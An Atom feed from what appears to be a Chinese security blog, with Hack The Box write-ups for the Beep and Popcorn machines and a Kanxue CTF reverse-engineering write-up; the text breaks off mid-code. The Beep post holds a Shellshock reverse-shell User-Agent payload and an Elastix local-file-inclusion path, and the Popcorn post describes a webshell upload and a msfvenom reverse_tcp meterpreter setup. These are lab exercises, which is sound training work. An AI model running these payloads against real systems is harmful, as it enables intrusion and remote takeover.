<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>foyjog</title>
  
  <subtitle>reversing engineer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://foyjog.github.io/"/>
  <updated>2019-05-17T08:26:35.517Z</updated>
  <id>https://foyjog.github.io/</id>
  
  <author>
    <name>foyjog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hack The Box Beep</title>
    <link href="https://foyjog.github.io/2019/05/17/Hack-The-Box-Beep/"/>
    <id>https://foyjog.github.io/2019/05/17/Hack-The-Box-Beep/</id>
    <published>2019-05-17T07:48:33.000Z</published>
    <updated>2019-05-17T08:26:35.517Z</updated>
    
    <content type="html"><![CDATA[<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>nmap来一波<br><img src="/img/BeepNmap.png" alt="我是图片">。<br>感觉上又很多点。</p><h3 id="bash漏洞"><a href="#bash漏洞" class="headerlink" title="bash漏洞"></a>bash漏洞</h3><p>打开10.10.10.7:10000，发现是个登陆窗口。<br><img src="/img/BeepLogin.png" alt="我是图片">。</p><p>利用burpsuite抓包，发现这个url是个cgi。所以试一试bash漏洞。<br><img src="/img/wget.png" alt="我是图片">。<br>利用python的SimpleHTTPServer模块。<br><img src="/img/wget2.png" alt="我是图片">。<br>发现我们的命令被执行了。执行如下步骤：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8081</span><br><span class="line"><span class="comment"># 设置User-Agent的值如下</span></span><br><span class="line">() &#123; :;&#125;; bash -i &gt;&amp; /dev/tcp/10.10.14.25/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>得到shell，竟然是个root权限= =。<br><img src="/img/success2.png" alt="我是图片">。<br><img src="/img/success3.png" alt="我是图片">。</p><h3 id="elastic漏洞"><a href="#elastic漏洞" class="headerlink" title="elastic漏洞"></a>elastic漏洞</h3><p>打开10.10.10.7，发现是个elastix的软件。利用searchsploit进行漏洞查找。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit elastix</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                           |  Path</span><br><span class="line">                                                                                                                                                                         | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Elastix - &apos;page&apos; Cross-Site Scripting                                                                                                                                    | exploits/php/webapps/38078.py</span><br><span class="line">Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                  | exploits/php/webapps/38544.txt</span><br><span class="line">Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                            | exploits/php/webapps/34942.txt</span><br><span class="line">Elastix 2.2.0 - &apos;graph.php&apos; Local File Inclusion                                                                                                                         | exploits/php/webapps/37637.pl</span><br><span class="line">Elastix 2.x - Blind SQL Injection                                                                                                                                        | exploits/php/webapps/36305.txt</span><br><span class="line">Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                       | exploits/php/webapps/38091.php</span><br><span class="line">FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                   | exploits/php/webapps/18650.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure></p><p>这里的’graph.php’ Local File Inclusion 是可以用的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span><br></pre></td></tr></table></figure></p><p>发现里面有个密码为jEhdIekWmdjE。试试ssh。</p><p><img src="/img/BeepRoot.png" alt="我是图片">。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;扫描&quot;&gt;&lt;a href=&quot;#扫描&quot; class=&quot;headerlink&quot; title=&quot;扫描&quot;&gt;&lt;/a&gt;扫描&lt;/h3&gt;&lt;p&gt;nmap来一波&lt;br&gt;&lt;img src=&quot;/img/BeepNmap.png&quot; alt=&quot;我是图片&quot;&gt;。&lt;br&gt;感觉上又很多点。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hack The Box Popcorn</title>
    <link href="https://foyjog.github.io/2019/05/17/Hack-The-Box-Popcorn/"/>
    <id>https://foyjog.github.io/2019/05/17/Hack-The-Box-Popcorn/</id>
    <published>2019-05-17T01:34:52.000Z</published>
    <updated>2019-05-17T05:24:28.046Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Hack The Box是一个渗透的靶机环境，只需要10欧元就可以玩退休的机器了，当然是买买买了。每一周回开放20个靶机供我们渗透。</p><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>nmap扫描改靶机，结果如下：<br><img src="/img/nmap.png" alt="我是图片"><br>发现80端口是开着的，用dirbuster扫一遍，结果发现有个torrent目录<br><img src="/img/torrent.png" alt="我是图片"><br>打开改url发现是个可以上传的共享文件网站，注册后登陆，上传一个种子之后发现还可以上传wallpaper.<br><img src="/img/wallpaper.png" alt="我是图片"></p><p>这里应该可以上传一句话木马，发现可以利用burpsuite过掉图片的验证。<br><img src="/img/burpsuite.png" alt="我是图片"><br>上传成功！发现可以在/upload目录下获取到该一句话木马。<br><img src="/img/success.png" alt="我是图片">。<br>直接上菜刀。<br><img src="/img/caidao.png" alt="我是图片">。</p><p>这里的提权可以使用Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - ‘Full-Nelson.c’ Local Privilege Escalation该exp。利用python -m SimpleHTTPServer上传该exp。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.3</span><br><span class="line"><span class="built_in">set</span> lport 4321</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>结果如下：</p><p><img src="/img/getroot.png" alt="我是图片">。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;Hack The Box是一个渗透的靶机环境，只需要10欧元就可以玩退休的机器了，当然是买买买了。每一周回开放20个靶机供我们渗透。&lt;/p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>看雪ctf第一赛季部分题目writeup</title>
    <link href="https://foyjog.github.io/2019/03/25/%E7%9C%8B%E9%9B%AActf%E7%AC%AC%E4%B8%80%E8%B5%9B%E5%AD%A3%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/"/>
    <id>https://foyjog.github.io/2019/03/25/看雪ctf第一赛季部分题目writeup/</id>
    <published>2019-03-25T07:25:07.000Z</published>
    <updated>2019-03-25T07:29:34.517Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近把论文整的差不多了，刚好有个看雪的比赛就玩一会儿，不得不说题目还是很有趣的，做了一部分，肝不动了= =</p><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>把文件拖入IDA进行分析，发现checkpasswd的函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">int</span> password_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">28</span>]; <span class="comment">// [esp+D8h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+F8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_DWORD *)(password_array + <span class="number">4</span> * v4) &lt; <span class="number">62</span> &amp;&amp; *(_DWORD *)(password_array + <span class="number">4</span> * v4) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(password_array + <span class="number">4</span> * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, <span class="string">"KanXueCTF2019JustForhappy"</span>) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出这里面有个置换的过程，其中置换的数组为：abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ。<br>可以写出如下solve:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span></span><br><span class="line">str2 = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">str3 = <span class="string">"KanXueCTF2019JustForhappy"</span></span><br><span class="line">kk = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> kk <span class="keyword">in</span> range(<span class="number">0</span>,len(str3)):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> str2:</span><br><span class="line">        <span class="keyword">if</span> ch &lt;= <span class="string">'9'</span> <span class="keyword">and</span> ch &gt;=<span class="string">'0'</span>:</span><br><span class="line">            <span class="keyword">if</span> str3[kk] == str1[ord(ch)<span class="number">-48</span>]:</span><br><span class="line">                <span class="keyword">print</span> ch,</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> ch &lt;= <span class="string">'Z'</span> <span class="keyword">and</span> ch &gt;=<span class="string">'A'</span>:</span><br><span class="line">            <span class="keyword">if</span> str3[kk] == str1[ord(ch)<span class="number">-29</span>]:</span><br><span class="line">                <span class="keyword">print</span> ch,</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> ch &lt;= <span class="string">'z'</span> <span class="keyword">and</span> ch &gt;=<span class="string">'a'</span>:</span><br><span class="line">            <span class="keyword">if</span> str3[kk] == str1[ord(ch)<span class="number">-87</span>]:</span><br><span class="line">                <span class="keyword">print</span> ch,</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>这道题目是一个安卓的题，主要是一个登陆界面，拖入jeb首先看前端。找到MainActivity如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompiatActivity</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">        WeakReference mWeakReference;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyHandler</span><span class="params">(MainActivity arg2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">            <span class="keyword">this</span>.mWeakReference = <span class="keyword">new</span> WeakReference(arg2);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>这有一个fake，MainActivity继承的是自定义的AppCompiatActivity，并不是AppCompatActivity，打开该类看一看。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppCompiatActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MSG_LOGIN;</span><br><span class="line">    <span class="keyword">private</span> Handler handler;</span><br><span class="line">    <span class="keyword">private</span> Button login;</span><br><span class="line">    <span class="keyword">private</span> String mName;</span><br><span class="line">    <span class="keyword">private</span> String mPassword;</span><br><span class="line">    <span class="keyword">private</span> EditText name;</span><br><span class="line">    <span class="keyword">private</span> EditText password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"oo000oo"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现这其实是真实的破解代码索要研究的内容。继续观察如下代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">eq</span><span class="params">(String arg1)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onStart();</span><br><span class="line">    <span class="keyword">this</span>.login = <span class="keyword">this</span>.findViewById(<span class="number">2131165260</span>);</span><br><span class="line">    <span class="keyword">this</span>.login.setOnClickListener(<span class="keyword">new</span> View$OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">            AppCompiatActivity.<span class="keyword">this</span>.mName = AppCompiatActivity.<span class="keyword">this</span>.name.getText().toString();</span><br><span class="line">            AppCompiatActivity.<span class="keyword">this</span>.mPassword = AppCompiatActivity.<span class="keyword">this</span>.password.getText().toString();</span><br><span class="line">            <span class="keyword">if</span>(!TextUtils.isEmpty(AppCompiatActivity.<span class="keyword">this</span>.mName)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(TextUtils.isEmpty(AppCompiatActivity.<span class="keyword">this</span>.mPassword)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">                    AppCompiatActivity.<span class="keyword">this</span>.login.setEnabled(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span>(AppCompiatActivity.<span class="keyword">this</span>.eq(AppCompiatActivity.<span class="keyword">this</span>.mPassword)) &#123;</span><br><span class="line">                        <span class="keyword">byte</span>[] v5 = AppCompiatActivity.<span class="keyword">this</span>.mPassword.getBytes();</span><br><span class="line">                        <span class="keyword">int</span> v3 = <span class="number">24</span>;</span><br><span class="line">                        <span class="keyword">if</span>(v5.length != v3) &#123;</span><br><span class="line">                            <span class="keyword">byte</span>[] v2 = <span class="keyword">new</span> <span class="keyword">byte</span>[v3];</span><br><span class="line">                            <span class="keyword">while</span>(v1 &lt; v2.length) &#123;</span><br><span class="line">                                <span class="keyword">byte</span> v3_1 = v1 &lt; v5.length ? v5[v1] : ((<span class="keyword">byte</span>)v1);</span><br><span class="line">                                v2[v1] = v3_1;</span><br><span class="line">                                ++v1;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            v5 = v2;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure></p><p>发现登陆时候使用了eq这个函数进行判断，eq改函数是前面的System.loadLibrary(“oo000oo”)中的，所以打开ida，对该so文件进行分析。<br>发现so文件中并没有eq该函数，所以判断在JNI_LOAD或者在init_array里面做了手脚。<br>JNI_LOAD函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">JNI_OnLoad</span><span class="params">(JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  JNIEnv *v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r6</span></span><br><span class="line">  JNIEnv *v5; <span class="comment">// [sp+0h] [bp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+4h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+8h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = v1;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))(*a1)-&gt;FindClass)() )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">LABEL_2:</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( _stack_chk_guard != v6 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">    v3 = v5;</span><br><span class="line">    v4 = ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, <span class="keyword">void</span> *))(*v5)-&gt;FindClass)(v5, off_CADFB010);</span><br><span class="line">    dword_CADFB110 = ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, <span class="keyword">int</span>))(*v3)-&gt;NewGlobalRef)(v3, v4);</span><br><span class="line">    <span class="keyword">if</span> ( !v4</span><br><span class="line">      || ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, <span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">signed</span> <span class="keyword">int</span>))(*v3)-&gt;RegisterNatives)(v3, v4, off_CADFB014, <span class="number">1</span>) &lt;= <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0x10006</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>init_array函数执行了datadiv_decode5009363700628197108字符串解密函数，两个函数以整合，可以知道eq函数就是sub_784函数。<br>该函数是一个判断函数，主要判断逻辑为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v28 = (v28 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v35 = (<span class="keyword">unsigned</span> __int8)v46[v28];</span><br><span class="line">    v30 = (v30 + v35) % <span class="number">256</span>;</span><br><span class="line">    v46[v28] = v46[v30];</span><br><span class="line">    v46[v30] = v35;</span><br><span class="line">    v17 = (<span class="keyword">char</span> *)(<span class="keyword">unsigned</span> __int8)v46[v28];</span><br><span class="line">    middle_value = v46[(<span class="keyword">unsigned</span> __int8)(v35 + (_BYTE)v17)] ^ password[v29];</span><br><span class="line">    <span class="keyword">if</span> ( v29 &amp;&amp; (v27 = <span class="number">0xAAAAAAAB</span> * (<span class="keyword">unsigned</span> __int64)v29 &gt;&gt; <span class="number">32</span>, v37 = <span class="number">3</span> * (v29 / <span class="number">3</span>), v37 != v29) )</span><br><span class="line">    &#123;</span><br><span class="line">      v31 = v29 == <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v29 != <span class="number">1</span> )</span><br><span class="line">        v31 = v37 + <span class="number">1</span> == v29;</span><br><span class="line">      <span class="keyword">if</span> ( v31 )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = <span class="built_in">array</span>;</span><br><span class="line">        v26[v44 + v29] = <span class="built_in">array</span>[(<span class="keyword">unsigned</span> __int8)v26[v44 + v29] | ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)middle_value &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">        v17 = &amp;v26[v44 + v29];</span><br><span class="line">        v27 = <span class="number">4</span> * middle_value &amp; <span class="number">0x3C</span>;</span><br><span class="line">        v17[<span class="number">1</span>] = v27;</span><br><span class="line">        <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v33 = v29 == <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v29 != <span class="number">2</span> )</span><br><span class="line">          v33 = v37 + <span class="number">2</span> == v29;</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = (<span class="keyword">char</span> *)(middle_value &amp; <span class="number">0xC0</span>);</span><br><span class="line">          v34 = v44++ + v29;</span><br><span class="line">          v26[v34] = <span class="built_in">array</span>[(<span class="keyword">unsigned</span> __int8)v26[v34] | ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v17 &gt;&gt; <span class="number">6</span>)] ^ <span class="number">0xF</span>;</span><br><span class="line">          v27 = (<span class="keyword">int</span>)&amp;v26[v34];</span><br><span class="line">          *(_BYTE *)(v27 + <span class="number">1</span>) = <span class="built_in">array</span>[middle_value &amp; <span class="number">0x3F</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v26[v44 + v29] = <span class="built_in">array</span>[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)middle_value &gt;&gt; <span class="number">2</span>] ^ <span class="number">7</span>;</span><br><span class="line">      v17 = &amp;v26[v44 + v29];</span><br><span class="line">      v27 = <span class="number">16</span> * middle_value &amp; <span class="number">0x30</span>;</span><br><span class="line">      v17[<span class="number">1</span>] = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">      &#123;</span><br><span class="line">        v38 = <span class="built_in">array</span>[v27];</span><br><span class="line">        *((_WORD *)v17 + <span class="number">1</span>) = <span class="number">0x3B3B</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v29 &lt; v24 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  该逻辑还是很好看懂的，可以写出如下的solve代码：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">#print hex(0x20 ^ 0x7)</span></span><br><span class="line"><span class="comment">#print hex(0x9b ^ 0x67)</span></span><br><span class="line"><span class="comment">#print hex(63&lt;&lt;2)</span></span><br><span class="line"><span class="comment">#print hex(0xfc^0x9b)</span></span><br><span class="line"><span class="comment">#print chr(0x67)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array1 =[<span class="number">0x20</span>,<span class="number">0x7B</span>,<span class="number">0x39</span>,<span class="number">0x2A</span>,<span class="number">0x38</span>,<span class="number">0x67</span>,<span class="number">0x61</span>,<span class="number">0x2A</span>,</span><br><span class="line"><span class="number">0x6C</span>,<span class="number">0x21</span>,<span class="number">0x54</span>,<span 